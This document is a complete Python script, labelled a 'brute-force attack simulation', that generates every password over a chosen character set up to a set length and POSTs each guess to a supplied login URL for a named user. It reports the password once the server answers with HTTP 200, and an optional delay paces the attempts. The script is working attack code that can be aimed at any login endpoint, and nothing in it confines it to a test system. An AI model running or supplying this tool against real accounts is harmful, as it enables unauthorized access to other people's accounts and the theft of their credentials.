import argparse
import itertools
import requests
import time

def generate_passwords(chars, max_length):
    """Generate passwords up to the specified max_length using the given chars."""
    for length in range(1, max_length + 1):
        for password_tuple in itertools.product(chars, repeat=length):
            yield ''.join(password_tuple)

def attempt_login(url, username, password):
    """Attempt to login with the given username and password."""
    try:
        response = requests.post(url, json={'username': username, 'password': password}, timeout=5)  # Set a timeout for the request
        print(f"Attempting login with {username} and password: {password}, Status Code: {response.status_code}")
        if response.status_code == 200:
            return 'success'
        elif response.status_code == 401:
            return 'unauthorized'
        else:
            return 'other_error'
    except requests.RequestException as e:
        print(f"Failed to make a request: {e}")
        return 'failed'

def main():
    parser = argparse.ArgumentParser(description="Brute-force attack simulation with adjustable rate limiting.")
    parser.add_argument("--url", required=True, help="Login URL")
    parser.add_argument("--user", required=True, help="Username for login")
    parser.add_argument("--max-length", type=int, required=True, help="Max length of password to generate")
    parser.add_argument("--chars", required=True, help="Characters to use for generating passwords")
    parser.add_argument("--rate-limit", type=int, default=0, help="Delay between login attempts in milliseconds (optional)")
    args = parser.parse_args()

    rate_limit_seconds = args.rate_limit / 1000.0  # Convert milliseconds to seconds

    try:
        for password in generate_passwords(args.chars, args.max_length):
            result = attempt_login(args.url, args.user, password)
            if result == 'success':
                print(f"Success! Password found: {password}")
                break
            elif result == 'other_error' or result == 'failed':
                print("Stopping due to an unexpected response or failure to connect.")
                break
            
            if args.rate_limit > 0:
                time.sleep(rate_limit_seconds)
    except Exception as e:
        print(f"Script failed due to an error: {e}")

if __name__ == "__main__":
    main()
